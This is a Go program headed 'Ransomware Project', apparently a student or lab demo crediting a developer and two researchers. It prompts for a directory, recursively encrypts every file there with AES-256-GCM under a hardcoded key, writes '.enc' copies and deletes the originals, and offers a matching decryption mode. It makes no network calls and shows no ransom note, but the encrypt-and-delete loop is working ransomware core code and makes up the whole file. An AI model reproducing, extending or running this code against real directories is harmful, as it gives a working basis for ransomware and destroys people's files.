package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func main() {

	var choose string
	var EncryptPath string
	var DecryptPath string
	var RunAgain string

	for {

		fmt.Println("................................................................... \n")
		fmt.Println("Ransomware Project \nCreate by \n Pongpan Laowaphong : Developer \n Borwornwich Pimason : Researcher \n Suchakree Panyawong : Researcher \n ")
		fmt.Printf("Do you want to Encryption or Decryption ? [E=Encryption,D=Decryption] : ")
		fmt.Scanf("%s", &choose)
		fmt.Scanf("%s", &choose)

		if choose == "E" || choose == "e" {

			fmt.Printf("Which path directory do you want to encrypt? [Ex. C:\\\\Users\\\\hieng\\\\Desktop\\\\Ransomware\\\\Experiment]: ")
			fmt.Scanf("%s", &EncryptPath) // Use Scanln for reading input
			fmt.Scanf("%s", &EncryptPath) // Use Scanln for reading input
			//fmt.Printf("%s \n", EncryptPath)

			//Initialize AES in GCM Mode
			key := []byte("thisisthesecretkeythatwillbeused") //32 bytes key for AES-256
			if len(key) != 32 {
				panic("key length must be 32 bytes for AES-256")
			}
			block, err := aes.NewCipher(key)
			if err != nil {
				panic("error while setting up aes : " + err.Error())
			}
			gcm, err := cipher.NewGCM(block)
			if err != nil {
				panic("error while setting up gcm : " + err.Error())
			}

			//Check current working directory
			cwd, err := os.Getwd()
			if err != nil {
				panic("error getting current dirrectory : " + err.Error())
			}
			fmt.Println("Current working directory: ", cwd)

			//define the directory path
			//dirPath := "C:\\Users\\hieng\\Desktop\\Ransomware\\Experiment"
			dirPath := EncryptPath

			//Ensure the directory exists
			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
				panic("directory does not exist: " + dirPath)
			}

			//Looping Through Target File
			err = filepath.WalkDir(dirPath, func(path string, info os.DirEntry, err error) error {
				if err != nil {
					return err
				}

				//Skip if directory
				if !info.IsDir() {
					fmt.Println("Encrypting " + path + "...")

					//Read file content
					original, err := os.ReadFile(path)
					if err != nil {
						fmt.Println("error while reading file contents: ", err)
						return err
					}

					//Encrypt Bytes
					nonce := make([]byte, gcm.NonceSize())
					if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
						fmt.Println("error while generating nonce: ", err)
						return err
					}
					encrypted := gcm.Seal(nonce, nonce, original, nil)

					//Write Encrypted contents
					encFilePath := path + ".enc"
					if err := os.WriteFile(encFilePath, encrypted, 0666); err != nil {
						fmt.Println("error while writing encrypted contents: ", err)
						return err
					}

					//Delete the original file
					if err := os.Remove(path); err != nil {
						fmt.Println("error while deleting the original file: ", err)
						return err
					}
				}
				return nil
			})
			if err != nil {
				fmt.Println("error walking the path: ", err)
			}

		} else if choose == "D" || choose == "d" {

			fmt.Printf("Which path directory do you want to decrypt? [Ex. C:\\\\Users\\\\hieng\\\\Desktop\\\\Ransomware\\\\Experiment]: ")
			fmt.Scanf("%s", &DecryptPath) // Use Scanln for reading input
			fmt.Scanf("%s", &DecryptPath) // Use Scanln for reading input
			//fmt.Printf("%s \n", DecryptPath)

			// INITIALIZE AES IN GCM MODE
			key := []byte("thisisthesecretkeythatwillbeused") // 32 bytes key for AES-256
			if len(key) != 32 {
				panic("key length must be 32 bytes for AES-256")
			}
			block, err := aes.NewCipher(key)
			if err != nil {
				panic("error while setting up aes: " + err.Error())
			}
			gcm, err := cipher.NewGCM(block)
			if err != nil {
				panic("error while setting up gcm: " + err.Error())
			}

			// Check current working directory
			cwd, err := os.Getwd()
			if err != nil {
				panic("error getting current directory: " + err.Error())
			}
			fmt.Println("Current working directory:", cwd)

			// Define the directory path
			//dirPath := "C:\\Users\\hieng\\Desktop\\Ransomware\\Experiment"
			dirPath := DecryptPath
			// Ensure the directory exists
			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
				panic("directory does not exist: " + dirPath)
			}

			// LOOPING THROUGH TARGET FILES
			err = filepath.WalkDir(dirPath, func(path string, info os.DirEntry, err error) error {
				if err != nil {
					return err
				}

				// SKIP IF DIRECTORY
				if info.IsDir() {
					return nil
				}

				// Process only encrypted files (those ending in .enc)
				if filepath.Ext(path) == ".enc" {
					fmt.Println("Decrypting", path, "...")

					// READ ENCRYPTED FILE CONTENTS
					encrypted, err := os.ReadFile(path)
					if err != nil {
						fmt.Println("error while reading encrypted file contents:", err)
						return err
					}

					// Extract nonce from the start of the encrypted content
					nonceSize := gcm.NonceSize()
					if len(encrypted) < nonceSize {
						fmt.Println("error: encrypted file too short")
						return fmt.Errorf("encrypted file too short")
					}
					nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]

					// DECRYPT BYTES
					plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
					if err != nil {
						fmt.Println("error while decrypting file contents:", err)
						return err
					}

					// WRITE DECRYPTED CONTENTS
					originalFilePath := path[:len(path)-len(".enc")]
					if err := os.WriteFile(originalFilePath, plaintext, 0666); err != nil {
						fmt.Println("error while writing decrypted contents:", err)
						return err
					}

					// DELETE THE ENCRYPTED FILE
					if err := os.Remove(path); err != nil {
						fmt.Println("error while deleting the encrypted file:", err)
						return err
					}
				}

				return nil
			})

			if err != nil {
				fmt.Println("error walking the path:", err)
			}

		} else {

			fmt.Println("Error. Please try again")

		}

		fmt.Printf("Do you want to run again ? [y/n]: ")
		fmt.Scanf("%s", &RunAgain)
		fmt.Scanf("%s", &RunAgain)

		if RunAgain == "n" || RunAgain == "N" {
			break
		}

	}

	//Prompt the user to press Enter to exit
	fmt.Println("Press Enter to exit...")
	fmt.Scanln()

	fmt.Println("Program exited.")

}
